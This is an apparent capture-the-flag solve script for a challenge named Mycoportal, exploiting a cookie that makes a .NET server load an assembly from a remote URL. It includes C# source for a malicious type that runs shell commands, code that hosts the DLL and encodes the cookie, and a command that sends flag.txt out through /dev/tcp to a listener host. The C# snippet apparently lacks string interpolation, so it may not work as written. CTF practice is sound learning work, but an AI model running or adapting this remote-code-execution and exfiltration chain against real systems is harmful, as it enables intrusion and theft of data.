#!/bin/env python
"""
Mycoportal - Flag 1

The goal of this flag is for the player to figure out that the cookie is loading the DLL and creating a type from the
DLL. The bug is that the `http(s)` schema is supported, so you can host a webserver and force the server to load
an arbitrary assembly. By crafting a malicious type which invokes System.Diagnostics.Process.Start, it's possible to
gain remote code execution.

The difficulty of the challenge lies in getting a working dotnet environment to build the malicious payload and
encoding it in the way that the cookie expects.

This script assumes that a DLL `Payloads.dll` has been built with the following C-Sharp Code:

```csharp
// Program.cs
namespace Payloads;

public class Execute
{
    public Execute()
    {

    }

    public string Cmd { 
        get => string.Empty; 
        
        set 
        {
            var cmd = value;
            System.Diagnostics.Process.Start("bash", "-c \"{cmd}\"");
        }
    }
}
```

This file can be generated if you run build/build.sh  (requires docker)
"""

from gzip import compress
from base64 import b64encode
from urllib.parse import quote
from os import path, chdir

from requests import Session
import threading
from pwn import *

import http.server
import socketserver

# Relative to `solve/`
PAYLOAD_PATH = "."
PAYLOAD_DLL = "Payloads.dll"
DEBUG = False

LHOST = 'shell.ctf'
LPORT = 8882
CMD=f"cat flag.txt > /dev/tcp/{LHOST}/{LPORT+1}"

RHOST='mycoportal.ctf'  # mycoportal.ctf
RPORT=80

class V6Server(socketserver.TCPServer):
    address_family = socket.AF_INET6
HTTPD = V6Server(("::", LPORT), http.server.SimpleHTTPRequestHandler)

def encode(data):
    """
    Encodes the payload by applying the following transforms:

        quote(b64(gzip(payload)))
    
    and returns it.
    """
    gzipped = compress(data)
    encoded = b64encode(gzipped)
    return quote(encoded)



class HttpServer(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self, daemon=True)
    
    def run(self):
        info(f"Spawning HTTP server on port [::]:{LPORT}")
        HTTPD.serve_forever()

def main():
    chdir(PAYLOAD_PATH)
    httpd = HttpServer()
    httpd.start()
    sleep(2)  # Allow some time for the socket to bind.

    # Build payload and serialize it
    rawPayload = f"http://{LHOST}:{LPORT}/{PAYLOAD_DLL}!Payloads.Execute🍄Cmd💬" + f"{CMD}🛑"  # Concat to avoid weird syntax highlight bug.
    payload = bytes(rawPayload, 'utf8')
    encoded = encode(payload)

    info(f"RAW:     {rawPayload}")
    info(f"PAYLOAD: {encoded}")
    S = Session()
    shell = listen(LPORT + 1)
    resp = S.get(f'http://{RHOST}:{RPORT}', cookies={'s': encoded})
    print(resp.text)
    info(f"Listening for connect back on port {LPORT + 1}")
    shell.wait_for_connection()
    flag = shell.recvline()
    success(f"Got flag: {flag}")
    HTTPD.shutdown()

main()
